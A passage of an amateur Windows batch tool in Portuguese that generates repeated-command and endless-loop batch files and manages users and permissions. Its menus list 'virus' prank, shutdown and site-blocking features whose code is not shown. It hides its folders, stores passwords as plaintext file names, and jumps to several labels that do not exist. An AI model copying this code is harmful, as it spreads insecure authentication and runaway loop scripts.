if not exist %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\repeticao\rep2\comtemp.txt goto replit2
if not exist %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\repeticao\rep3\comtemp.txt goto replit3
if not exist %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\repeticao\rep4\comtemp.txt goto replit4
goto replit5
:replit1
set localir=%userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\repeticao\rep1
set repsalv=prirepsalv
cls
goto crirep
:replit2
set localir=%userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\repeticao\rep2
set repsalv=secrepsalv
cls
goto crirep
:replit3
set localir=%userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\repeticao\rep3
set repsalv=terrepsalv
cls
goto crirep
:replit4
set localir=%userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\repeticao\rep4
set repsalv=quarepsalv
cls
goto crirep
:replit5
set localir=%userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\repeticao\rep5
goto crirep
:crirep
set /p nome=***nome como salvar o arquivo(com extensao)---
echo iremos abrir o notepad...
pause
mkdir %localir%
attrib +s +h /s /d %localir%
copy NUL %localir%\comtemp.txt
echo set %repsalv%=%nome% > %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\repeticao\todas\%repsalv%.bat
start %localir%\comtemp.txt
cls
echo digite o comandoa ser repetido, salve e continue...
pause
set locavolt=com81
goto com8repetidorb
:com82
cls
set /p nome=***digite o nome para salvar o arquivo(sem extensao)
mkdir %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\loop
attrib +s +h /s /d %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%
echo :ini >> %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\loop\comtemp.txt
echo. >> %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\loop\comtemp.txt
echo. >> %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\loop\comtemp.txt
echo. >> %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\loop\comtemp.txt
echo. >> %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\loop\comtemp.txt
echo. >> %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\loop\comtemp.txt
echo goto ini >> %userprofile%\arquivos_temporarios_do_gerador\loop\comtemp.txt
cls
echo Abriremos o notepad, para que voce digite o seu comando!
echo.
echo Digite o codigo que deseja repetir, JAMAIS APAGANDO os
echo dois comandos ja esistentes no comando!!!
pause
start %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\repeticao\arquivos_temporarios_do_gerador\loop\comtemp.txt
cls
echo conclua o comando, salve as alteracoes, e continue!!!
pause
copy %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\repeticao\arquivos_temporarios_do_gerador\loop\comtemp.txt %nome%.bat
del /q %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\loop\comtemp.txt
cls
echo o loop foi concluido!!!
pause
goto com8
:com8repetidor
set /p quant=***quantidade de vezes que o comando se reperira---
set /a dezpor=%quant% * 10 / 100
set /a vinpor=%quant% * 20 / 100
set /a trinpor=%quant% * 30 / 100
set /a quarpor=%quant% * 40 / 100
set /a cinqpor=%quant% * 50 / 100
set /a sespor=%quant% * 60 / 100
set /a setpor=%quant% * 70 / 100
set /a oitpor=%quant% * 80 / 100
set /a novpor=%quant% * 90 / 100
set quantt=0
set lugar=por0
:rept
echo %comand% >> %nome%
set /a quanti=%quantt%+1
set quantt=%quanti%
if %quantt% equ %quant% goto por100
if %quantt% equ %novpor% goto por90
if %quantt% equ %oitpor% goto por80
if %quantt% equ %setpor% goto por70
if %quantt% equ %sespor% goto por60
if %quantt% equ %cinqpor% goto por50
if %quantt% equ %quarpor% goto por40
if %quantt% equ %trinpor% goto por30
if %quantt% equ %vinpor% goto por20
if %quantt% equ %dezpor% goto por10
goto %lugar%
:por0
cls
echo    @@@@@@@@@@@@@@@@@@@@@@
echo    @                    @      0 por cento
echo    @                    @       concluido
echo    @@@@@@@@@@@@@@@@@@@@@@
echo.
echo  %quantt% de %quant% repeticoes salvas
set lugar=por0
goto rept
:por10
cls
echo    @@@@@@@@@@@@@@@@@@@@@@
echo    @##                  @     10 por cento
echo    @##                  @       concluido
echo    @@@@@@@@@@@@@@@@@@@@@@
echo.
echo  %quantt% de %quant% repeticoes salvas
set lugar=por10
goto rept
:por20
cls
echo    @@@@@@@@@@@@@@@@@@@@@@
echo    @####                @     20 por cento
echo    @####                @       concluido
echo    @@@@@@@@@@@@@@@@@@@@@@
echo.
echo  %quantt% de %quant% repeticoes salvas
set lugar=por20
goto rept
:por30
cls
echo    @@@@@@@@@@@@@@@@@@@@@@
echo    @######              @     30 por cento
echo    @######              @       concluido
echo    @@@@@@@@@@@@@@@@@@@@@@
echo.
echo  %quantt% de %quant% repeticoes salvas
set lugar=por30
goto rept
:por40
cls
echo    @@@@@@@@@@@@@@@@@@@@@@
echo    @########            @     40 por cento
echo    @########            @       concluido
echo    @@@@@@@@@@@@@@@@@@@@@@
echo.
echo  %quantt% de %quant% repeticoes salvas
set lugar=por40
goto rept
:por50
cls
echo    @@@@@@@@@@@@@@@@@@@@@@
echo    @##########          @     50 por cento
echo    @##########          @       concluido
echo    @@@@@@@@@@@@@@@@@@@@@@
echo.
echo  %quantt% de %quant% repeticoes salvas
set lugar=por50
goto rept
:por60
cls
echo    @@@@@@@@@@@@@@@@@@@@@@
echo    @############        @     60 por cento
echo    @############        @       concluido
echo    @@@@@@@@@@@@@@@@@@@@@@
echo.
echo  %quantt% de %quant% repeticoes salvas
set lugar=por60
goto rept
:por70
cls
echo    @@@@@@@@@@@@@@@@@@@@@@
echo    @##############      @     70 por cento
echo    @##############      @       concluido
echo    @@@@@@@@@@@@@@@@@@@@@@
echo.
echo  %quantt% de %quant% repeticoes salvas
set lugar=por70
goto rept
:por80
cls
echo    @@@@@@@@@@@@@@@@@@@@@@
echo    @################    @     80 por cento
echo    @################    @       concluido
echo    @@@@@@@@@@@@@@@@@@@@@@
echo.
echo  %quantt% de %quant% repeticoes salvas
set lugar=por80
goto rept
:por90
cls
echo    @@@@@@@@@@@@@@@@@@@@@@
echo    @##################  @     90 por cento
echo    @##################  @       concluido
echo    @@@@@@@@@@@@@@@@@@@@@@
echo.
echo  %quantt% de %quant% repeticoes salvas
set lugar=por90
goto rept
:por100
cls
echo    @@@@@@@@@@@@@@@@@@@@@@
echo    @####################@     100 por cento
echo    @####################@       concluido
echo    @@@@@@@@@@@@@@@@@@@@@@
echo.
echo  Todas as %quant% repeticoes foram salvas!!!
pause
goto %locavolt%
:com8repetidorb
set quantt=0
set /p quanty=***quantidade de vezes que o comando se reperira---
echo %nome% > %localir%\%nome%
echo set quanty=%quanty% > %localir%\quanty.bat
mkdir %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\repeticao\todas
copy NUL %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\repeticao\todas\%nome% 
echo %quanty% > %localir%\quantvez.gc
set /a quant=%quanty%-1
echo set quant=%quant% > %localir%\quant.bat
:com8repetidorbreppend
set /a dezpor=%quant% * 10 / 100
set /a vinpor=%quant% * 20 / 100
set /a trinpor=%quant% * 30 / 100
set /a quarpor=%quant% * 40 / 100
set /a cinqpor=%quant% * 50 / 100
set /a sespor=%quant% * 60 / 100
set /a setpor=%quant% * 70 / 100
set /a oitpor=%quant% * 80 / 100
set /a novpor=%quant% * 90 / 100
set lugar=por0b
:reptb
copy %localir%\comtemp.txt %localir%\comandotemp%quantt%.txt
set /a quanti=%quantt%+1
set quantt=%quanti%
echo set quantt=%quantt% > %localir%\quantt.bat
if %quantt% equ %quant% goto por100b
if %quantt% equ %novpor% goto por90b
if %quantt% equ %oitpor% goto por80b
if %quantt% equ %setpor% goto por70b
if %quantt% equ %sespor% goto por60b
if %quantt% equ %cinqpor% goto por50b
if %quantt% equ %quarpor% goto por40b
if %quantt% equ %trinpor% goto por30b
if %quantt% equ %vinpor% goto por20b
if %quantt% equ %dezpor% goto por10b
goto %lugar%
:por0b
cls
echo    @@@@@@@@@@@@@@@@@@@@@@
echo    @                    @      0 por cento
echo    @                    @       concluido
echo    @@@@@@@@@@@@@@@@@@@@@@
echo.
echo  %quantt% de %quanty% repeticoes salvas 
set lugar=por0b
goto reptb
:por10b
cls
echo    @@@@@@@@@@@@@@@@@@@@@@
echo    @##                  @     10 por cento
echo    @##                  @       concluido
echo    @@@@@@@@@@@@@@@@@@@@@@
echo.
echo  %quantt% de %quanty% repeticoes salvas 
set lugar=por10b
goto reptb
:por20b
cls
echo    @@@@@@@@@@@@@@@@@@@@@@
echo    @####                @     20 por cento
echo    @####                @       concluido
echo    @@@@@@@@@@@@@@@@@@@@@@
echo.
echo  %quantt% de %quanty% repeticoes salvas 
set lugar=por20b
goto reptb
:por30b
cls
echo    @@@@@@@@@@@@@@@@@@@@@@
echo    @######              @     30 por cento
echo    @######              @       concluido
echo    @@@@@@@@@@@@@@@@@@@@@@
echo.
echo  %quantt% de %quanty% repeticoes salvas 
set lugar=por30b
goto reptb
:por40b
cls
echo    @@@@@@@@@@@@@@@@@@@@@@
echo    @########            @     40 por cento
echo    @########            @       concluido
echo    @@@@@@@@@@@@@@@@@@@@@@
echo.
echo  %quantt% de %quanty% repeticoes salvas
set lugar=por40b
goto reptb
:por50b
cls
echo    @@@@@@@@@@@@@@@@@@@@@@
echo    @##########          @     50 por cento
echo    @##########          @       concluido
echo    @@@@@@@@@@@@@@@@@@@@@@
echo.
echo  %quantt% de %quanty% repeticoes salvas
set lugar=por50b
goto reptb
:por60b
cls
echo    @@@@@@@@@@@@@@@@@@@@@@
echo    @############        @     60 por cento
echo    @############        @       concluido
echo    @@@@@@@@@@@@@@@@@@@@@@
echo.
echo  %quantt% de %quanty% repeticoes salvas
set lugar=por60b
goto reptb
:por70b
cls
echo    @@@@@@@@@@@@@@@@@@@@@@
echo    @##############      @     70 por cento
echo    @##############      @       concluido
echo    @@@@@@@@@@@@@@@@@@@@@@
echo.
echo  %quantt% de %quanty% repeticoes salvas
set lugar=por70b
goto reptb
:por80b
cls
echo    @@@@@@@@@@@@@@@@@@@@@@
echo    @################    @     80 por cento
echo    @################    @       concluido
echo    @@@@@@@@@@@@@@@@@@@@@@
echo.
echo  %quantt% de %quanty% repeticoes salvas 
set lugar=por80b
goto reptb
:por90b
cls
echo    @@@@@@@@@@@@@@@@@@@@@@
echo    @##################  @     90 por cento
echo    @##################  @       concluido
echo    @@@@@@@@@@@@@@@@@@@@@@
echo.
echo  %quantt% de %quanty% repeticoes salvas 
set lugar=por90b
goto reptb
:por100b
cls
echo    @@@@@@@@@@@@@@@@@@@@@@
echo    @####################@     100 por cento
echo    @####################@       concluido
echo    @@@@@@@@@@@@@@@@@@@@@@
echo.
echo  Todas as %quanty% repeticoes foram salvas!!!
cls
echo estamos copiando seus comandos
cd desktop
copy %localir%\*.txt %nome%
del /q %localir%\*.*
del /q %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\repeticao\todas\%nome%
del /q %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\repeticao\todas\%repsalv%.bat
RD %localir%
cls
echo repeticoes salvas no arquivo %nome%, no diretorio deste gerador...
echo OBS: em alguns casos ele sera salvo na area de trabalho...
pause
goto %locavolt%
:reppend
set opcao=0
cls
echo há repeticoes pendentes!!!
echo O que deseja fazer?
echo.
echo  1---Ignorar
echo  2---Ver
echo  3---descartar tudo
set /p opcao=***digite sua opcao---
if %opcao% equ 1 goto com
if %opcao% equ 2 goto verreppend
if %opcao% equ 3 goto delreppend
goto reppend
:verreppend
call %userprofile%\arquivos_temporarios_do_gerador\repeticao\todas\prirepsalv.bat
call %userprofile%\arquivos_temporarios_do_gerador\repeticao\todas\secrepsalv.bat
call %userprofile%\arquivos_temporarios_do_gerador\repeticao\todas\terrepsalv.bat
call %userprofile%\arquivos_temporarios_do_gerador\repeticao\todas\quarepsalv.bat
cls
echo. %prirepsalv%
echo. %secrepsalv%
echo. %terrepsalv%
echo. %quarepsalv%
set nome=0
set /p nome=***digite o nome da repeticao a retomar---
if exist %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\repeticao\todas\%nome% goto conrep
goto verreppend
:conrep
set quantt=0
if exist %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\repeticao\rep1\%nome% goto conrep1
if exist %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\repeticao\rep2\%nome% goto conrep2
if exist %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\repeticao\rep3\%nome% goto conrep3
if exist %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\repeticao\rep4\%nome% goto conrep4
echo falhou!
pause
goto com
:conrep1
set localir=%userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\repeticao\rep1
call %localir%\quantt.bat
call %localir%\quanty.bat
call %localir%\quant.bat
goto com8repetidorbreppend
:conrep2
set localir=%userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\repeticao\rep2
call %localir%\quantt.bat
call %localir%\quanty.bat
call %localir%\quant.bat
goto com8repetidorbreppend
:conrep3
set localir=%userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\repeticao\rep3
call %localir%\quantt.bat
call %localir%\quanty.bat
call %localir%\quant.bat
goto com8repetidorbreppend
:conrep4
set localir=%userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\repeticao\rep4
call %localir%\quantt.bat
call %localir%\quanty.bat
call %localir%\quant.bat
goto com8repetidorbreppend
:delreppend
del /q %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\repeticao\rep1\*.*
del /q %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\repeticao\rep2\*.*
del /q %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\repeticao\rep3\*.*
del /q %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\repeticao\rep4\*.*
del /q %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\repeticao\todas\*.*
RD %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\repeticao\rep1
RD %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\repeticao\rep2
RD %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\repeticao\rep3
RD %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\repeticao\rep4
RD %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\repeticao\todas
echo foram deletados...
pause
goto com
:config
cls
echo #########################################################
echo # 1----Configurar/alterar/criar  usuarios...............#
echo # 2----limpar arquivos do usuario.......................#
echo # 3----Local onde os arquivos serao salvos..............#
echo # 4----Voltar...........................................#
echo #########################################################
set opcao=0
set /p opcao=***digite sua opcao---
if %opcao% equ 1 goto confuser
if %opcao% equ 2 goto limpdad
if %opcao% equ 3 goto localarqsalv
if %opcao% equ 4 goto com
goto config
:localarqsalv
cls
set /p cam=***digite o caminho---
set userprofile=%cam%
cls
echo o caminho foi alterado temporariamente!!!
echo Quando o gerador for reiniciado volta ao normal...
pause
goto config
:confuser
cls
echo #########################################################
echo # 1----Novo usuario.....................................#
echo # 2----Alterar/criar senha de usuario...................#
echo # 3----Deletar usuario..................................#
echo # 4----Alterar permicoes de usuarios....................#
echo # 5----Voltar...........................................#
echo #########################################################
set opcao=0
set /p opcao=***digite sua opcao---
if %opcao% equ 1 goto confuser1
if %opcao% equ 2 goto confuser2
if %opcao% equ 3 goto confuser3
if %opcao% equ 4 goto confuser4
if %opcao% equ 5 goto config
goto confuser
:confuser1
cls
set /p novuser=digite o nome do novo usuario(sem espacos)---
:ersenha
set senha=NUL
set senha2=NUL
set /p senha=***nova senha (sem espacos)---
set /p senha2=***redigite a senha---
if %senha% equ %senha2% goto crinovuser
cls
echo as duas senhas nao sao iguais!
pause
goto ersenha
:crinovuser
mkdir %userprofile%\arquivos_temporarios_do_gerador\users\%novuser%
copy NUL %userprofile%\arquivos_temporarios_do_gerador\users\%novuser%\APUA1.gc
copy NUL %userprofile%\arquivos_temporarios_do_gerador\users\%novuser%\APUA2.gc
copy NUL %userprofile%\arquivos_temporarios_do_gerador\users\%novuser%\APUA3.gc
copy NUL %userprofile%\arquivos_temporarios_do_gerador\users\%novuser%\APUA4.gc
copy NUL %userprofile%\arquivos_temporarios_do_gerador\users\%novuser%\APUA5.gc
copy NUL %userprofile%\arquivos_temporarios_do_gerador\users\%novuser%\APUA6.gc
copy NUL %userprofile%\arquivos_temporarios_do_gerador\users\%novuser%\APUA7.gc
copy NUL %userprofile%\arquivos_temporarios_do_gerador\users\%novuser%\APUA8.gc
copy NUL %userprofile%\arquivos_temporarios_do_gerador\users\users.gc
copy NUL %userprofile%\arquivos_temporarios_do_gerador\users\%novuser%\%senha%.key
echo %novuser% > %userprofile%\arquivos_temporarios_do_gerador\users\%novuser%.user
cls
echo Novo usuario criado!
goto confuser
:confuser2
if exist %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\APUAconfA.gc goto aluserssenha
cls
set /p senha=***digite sua nova senha---
del %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\*.key
copy NUL %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\%senha%.key
cls
echo a senha foi alterada!
echo a nova senha e %senha%
pause
goto confuser
:aluserssenha
copy %userprofile%\arquivos_temporarios_do_gerador\users\*.user %userprofile%\arquivos_temporarios_do_gerador\users\al.us
cls
type %userprofile%\arquivos_temporarios_do_gerador\users\al.us
set /p usconfsenha=***digite o nome do usuario---
if exist %userprofile%\arquivos_temporarios_do_gerador\users\%usconfsenha%.user goto contimudsenha
goto aluressenha
:contimudsenha
del /q %userprofile%\arquivos_temporarios_do_gerador\users\al.us
cls
set /p senha=***digite sua nova senha---
del %userprofile%\arquivos_temporarios_do_gerador\users\%usconfsenha%\*.key
copy NUL %userprofile%\arquivos_temporarios_do_gerador\users\%usconfsenha%\%senha%.key
cls
echo a senha foi alterada!
echo a nova senha e %senha%
pause
goto confuser
:confuser3
if exist %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\APUAconfA.gc goto deltaalusers
cls
set /p opcao=***tem certesa que deseja deletar TODOS os arquivos deste usuario?(s/n)---
if %opcao% equ s goto deluseraa
if %opcao% equ S goto deluseraa
if %opcao% equ N goto confuser
if %opcao% equ n goto confuser
goto confuser3
:set userdel=%usernam%
goto delusera
:delusera
del /q %userprofile%\arquivos_temporarios_do_gerador\users\%userdel%\APUA1.gc
del /q %userprofile%\arquivos_temporarios_do_gerador\users\%userdel%\APUA2.gc
del /q %userprofile%\arquivos_temporarios_do_gerador\users\%userdel%\APUA3.gc
del /q %userprofile%\arquivos_temporarios_do_gerador\users\%userdel%\APUA4.gc
del /q %userprofile%\arquivos_temporarios_do_gerador\users\%userdel%\APUA5.gc
del /q %userprofile%\arquivos_temporarios_do_gerador\users\%userdel%\APUA6.gc
del /q %userprofile%\arquivos_temporarios_do_gerador\users\%userdel%\APUA7.gc
del /q %userprofile%\arquivos_temporarios_do_gerador\users\%userdel%\APUA8.gc
del /q %userprofile%\arquivos_temporarios_do_gerador\users\%userdel%\APUAconfA.gc
del /q %userprofile%\arquivos_temporarios_do_gerador\users\%userdel%\NUL.key
del /q %userprofile%\arquivos_temporarios_do_gerador\users\%userdel%.user
del /q %userprofile%\arquivos_temporarios_do_gerador\users\%userdel%.user
del /q %userprofile%\arquivos_temporarios_do_gerador\users\%userdel%\repeticao\rep1\*.*
del /q %userprofile%\arquivos_temporarios_do_gerador\users\%userdel%\repeticao\rep2\*.*
del /q %userprofile%\arquivos_temporarios_do_gerador\users\%userdel%\repeticao\rep3\*.*
del /q %userprofile%\arquivos_temporarios_do_gerador\users\%userdel%\repeticao\rep4\*.*
del /q %userprofile%\arquivos_temporarios_do_gerador\users\%userdel%\repeticao\todas\*.*
RD %userprofile%\arquivos_temporarios_do_gerador\users\%userdel%\repeticao\rep1
RD %userprofile%\arquivos_temporarios_do_gerador\users\%userdel%\repeticao\rep2
RD %userprofile%\arquivos_temporarios_do_gerador\users\%userdel%\repeticao\rep3
RD %userprofile%\arquivos_temporarios_do_gerador\users\%userdel%\repeticao\rep4
RD %userprofile%\arquivos_temporarios_do_gerador\users\%userdel%\repeticao\todas
RD %userprofile%\arquivos_temporarios_do_gerador\users\%userdel%
cls
echo o usuario soi removido com sucesso!
echo reiniciaremos o gerador...
pause
goto inicio
:deltaalusers
copy %userprofile%\arquivos_temporarios_do_gerador\users\*.user %userprofile%\arquivos_temporarios_do_gerador\users\al.us
cls
type %userprofile%\arquivos_temporarios_do_gerador\users\al.us
set /p userdel=***digite o nome do usuario---
if exist %userprofile%\arquivos_temporarios_do_gerador\users\%userdel%.user goto contidelaluser
goto deltaalusers
:contidelaluser
cls
set /p opcao=***tem certesa que deseja deletar TODOS os arquivos deste usuario?(s/n)---
if %opcao% equ s goto delusera
if %opcao% equ S goto delusera
if %opcao% equ N goto confuser
if %opcao% equ n goto confuser
goto contidelaluser
:confuser4
if exist %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\APUAconfA.gc goto peradmin
cls
echo voce tem permicao de administrador para continuar!!!
pause
goto confuser
:peradmin
cls
copy %userprofile%\arquivos_temporarios_do_gerador\users\*.user %userprofile%\arquivos_temporarios_do_gerador\users\al.us
cls
type %userprofile%\arquivos_temporarios_do_gerador\users\al.us
set /p useralt=***digite o nome do usuario a ser alterado---
if exist %userprofile%\arquivos_temporarios_do_gerador\users\%useralt%.user goto contaltper
goto paradmin
:contaltper
cls
echo ##########################
echo # 1---adicionar permicao #
echo # 2---remover permicao   #
echo # 3---voltar             #
echo ##########################
set opcao=0
set /p opcao=***digite sua opcao---
if %opcao% equ 1 goto addper
if %opcao% equ 2 goto rddper
if %opcao% equ 3 goto confuser
goto contaltper
:addper
cls
echo #########################################################
echo # 1----Ver processos em andamento.......................#
echo # 2----Desligar o PC....................................#
echo # 3----Fechar programas.................................#
echo # 4----Enviar caixa de dialogo..........................#
echo # 5----Calculadora......................................#
echo # 6----Virus e sacanagens...............................#
echo # 7----Bloquear sites...................................#
echo # 8----Repetidor/Loop...................................#
echo # 9----Remover virus.(escolar)..........................#
echo # 10---Permicao de administrador........................#
echo #########################################################
echo                   digite 11 para voltar
echo.
set opcao=0
set /p opcao=***digite o numero do que deseja liberar--- 
if %opcao% equ 1 goto com1lib
if %opcao% equ 2 goto com2lib
if %opcao% equ 3 goto com3lib
if %opcao% equ 4 goto com4lib
if %opcao% equ 5 goto com5lib
if %opcao% equ 6 goto com6lib
if %opcao% equ 7 goto com7lib
if %opcao% equ 8 goto com8lib
if %opcao% equ 9 goto com9lib
if %opcao% equ 10 goto perdminadd
if %opcao% equ 11 goto confuser
goto addper
:com1lib
copy NUL %userprofile%\arquivos_temporarios_do_gerador\users\%useralt%\APUA1.gc
cls
echo adicionado!
pause
goto addper
:com2lib
copy NUL %userprofile%\arquivos_temporarios_do_gerador\users\%useralt%\APUA2.gc
cls
echo adicionado!
pause
goto addper
:com3lib
copy NUL %userprofile%\arquivos_temporarios_do_gerador\users\%useralt%\APUA3.gc
cls
echo adicionado!
pause
goto addper
:com4lib
copy NUL %userprofile%\arquivos_temporarios_do_gerador\users\%useralt%\APUA4.gc
cls
echo adicionado!
pause
goto addper
:com5lib
copy NUL %userprofile%\arquivos_temporarios_do_gerador\users\%useralt%\APUA5.gc
cls
echo adicionado!
pause
goto addper
:com6lib
copy NUL %userprofile%\arquivos_temporarios_do_gerador\users\%useralt%\APUA6.gc
cls
echo adicionado!
pause
goto addper
:com7lib
copy NUL %userprofile%\arquivos_temporarios_do_gerador\users\%useralt%\APUA7.gc
cls
echo adicionado!
pause
goto addper
:com8lib
copy NUL %userprofile%\arquivos_temporarios_do_gerador\users\%useralt%\APUA8.gc
cls
echo adicionado!
pause
goto addper
:com9lib
copy NUL %userprofile%\arquivos_temporarios_do_gerador\users\%useralt%\APUA9.gc
cls
echo adicionado!
pause
goto addper
:perdminadd
copy NUL %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\APUAconfA.gc
cls
echo adicionado!
pause
goto addper
:rddper
cls
echo #########################################################
echo # 1----Ver processos em andamento.......................#
echo # 2----Desligar o PC....................................#
echo # 3----Fechar programas.................................#
echo # 4----Enviar caixa de dialogo..........................#
echo # 5----Calculadora......................................#
echo # 6----Virus e sacanagens...............................#
echo # 7----Bloquear sites...................................#
echo # 8----Repetidor/Loop...................................#
echo # 9----Remover virus.(escolar)..........................#
echo # 10---Permicao de administrador........................#
echo #########################################################
echo                   digite 11 para voltar
echo.
set opcao=0
set /p opcao=***digite o numero do que deseja bloquear--- 
if %opcao% equ 1 goto com1blok
if %opcao% equ 2 goto com2blok
if %opcao% equ 3 goto com3blok
if %opcao% equ 4 goto com4blok
if %opcao% equ 5 goto com5blok
if %opcao% equ 6 goto com6blok
if %opcao% equ 7 goto com7blok
if %opcao% equ 8 goto com8blok
if %opcao% equ 9 goto com9blok
if %opcao% equ 10 goto perdminblok
if %opcao% equ 11 goto confuser
goto addper
:com1blok
del /q  %userprofile%\arquivos_temporarios_do_gerador\users\%useralt%\APUA1.gc
cls
echo bloqueado!
pause
goto addper
:com2blok
del /q  %userprofile%\arquivos_temporarios_do_gerador\users\%useralt%\APUA2.gc
cls
echo bloqueado!
pause
goto addper
:com3blok
del /q  %userprofile%\arquivos_temporarios_do_gerador\users\%useralt%\APUA3.gc
cls
echo bloqueado!
pause
goto addper
:com4blok
del /q  %userprofile%\arquivos_temporarios_do_gerador\users\%useralt%\APUA4.gc
cls
echo bloqueado!
pause
goto addper
:com5blok
del /q  %userprofile%\arquivos_temporarios_do_gerador\users\%useralt%\APUA5.gc
cls
echo bloqueado!
pause
goto addper
:com6blok
del /q  %userprofile%\arquivos_temporarios_do_gerador\users\%useralt%\APUA6.gc
cls
echo bloqueado!
pause
goto addper
:com7blok
del /q  %userprofile%\arquivos_temporarios_do_gerador\users\%useralt%\APUA7.gc
cls
echo bloqueado!
pause
goto addper
:com8blok
del /q  %userprofile%\arquivos_temporarios_do_gerador\users\%useralt%\APUA8.gc
cls
echo bloqueado!
pause
goto addper
:com9blok
del /q  %userprofile%\arquivos_temporarios_do_gerador\users\%useralt%\APUA9.gc
cls
echo bloqueado!
pause
goto addper
:perdminblok
del /q  %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\APUAconfA.gc
cls
echo bloqueado!
pause
goto rddper
:users
cls
copy %userprofile%\arquivos_temporarios_do_gerador\users\*.user %userprofile%\arquivos_temporarios_do_gerador\users\al.us
if not exist %userprofile%\arquivos_temporarios_do_gerador\users\al.us goto notuser
cls
echo nao consegue acessar sua conta? digite AJUDA 

echo.
echo.
echo.
set /p usernam=***Digite o seu nome de usuario---
if %usernam% equ ajuda goto AJUDA
if %usernam% equ AJUDA goto AJUDA
set senha=NUL
set /p senha=***digite sua senha---
if %usernam% equ ajuda goto AJUDA
if %usernam% equ AJUDA goto AJUDA
if exist %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\%senha%.key goto verific
cls
echo Nome de usuario ou/e senha incorretos! tente novamente
pause
goto users
:notuser
set usernam=Administrador
mkdir %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%
copy NUL %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\APUA1.gc
copy NUL %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\APUA2.gc
copy NUL %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\APUA3.gc
copy NUL %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\APUA4.gc
copy NUL %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\APUA5.gc
copy NUL %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\APUA6.gc
copy NUL %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\APUA7.gc
copy NUL %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\APUA8.gc
copy NUL %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\APUA9.gc
copy NUL %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\APUAconfA.gc
copy NUL %userprofile%\arquivos_temporarios_do_gerador\users\%usernam%\NUL.key
goto verific
:limpdad
cls
set opcao=0
set /p opcao=***Tem certesa que dejeja continuar?(s/n)---
if %opcao% equ S goto limpdadusconf
if %opcao% equ s goto limpdadusconf
if %opcao% equ N goto config
if %opcao% equ n goto config
goto limpdad
:limpdadusconf
del /q %userprofile%\arquivos_temporarios_do_gerador\users\%userdel%\repeticao\rep1\*.*
del /q %userprofile%\arquivos_temporarios_do_gerador\users\%userdel%\repeticao\rep2\*.*
del /q %userprofile%\arquivos_temporarios_do_gerador\users\%userdel%\repeticao\rep3\*.*
del /q %userprofile%\arquivos_temporarios_do_gerador\users\%userdel%\repeticao\rep4\*.*
del /q %userprofile%\arquivos_temporarios_do_gerador\users\%userdel%\repeticao\todas\*.*
RD %userprofile%\arquivos_temporarios_do_gerador\users\%userdel%\repeticao\rep1
RD %userprofile%\arquivos_temporarios_do_gerador\users\%userdel%\repeticao\rep2
RD %userprofile%\arquivos_temporarios_do_gerador\users\%userdel%\repeticao\rep3
RD %userprofile%\arquivos_temporarios_do_gerador\users\%userdel%\repeticao\rep4
RD %userprofile%\arquivos_temporarios_do_gerador\users\%userdel%\repeticao\todas
cls
echo Todos os dados foram limpos!
echo.
echo Sera necessario reiniciar o gerador!
pause
goto com
:notpodiss
cls
color 0c
echo #####################################################################
echo #   #    #                                                          #
echo #    #  #     O Administrador nogou o acesso a este aplicativo!     #
echo #     ##   Para liberar este aplicativo entre em contato com ele!   #
echo #     ##                                                            #
echo #    #  #                                                           #
echo #   #    #                                                          #
echo #####################################################################
pause
color 0b
goto com
:AJUDA
set userprofile=C:\
attrib +s +h configGC.bat
cls
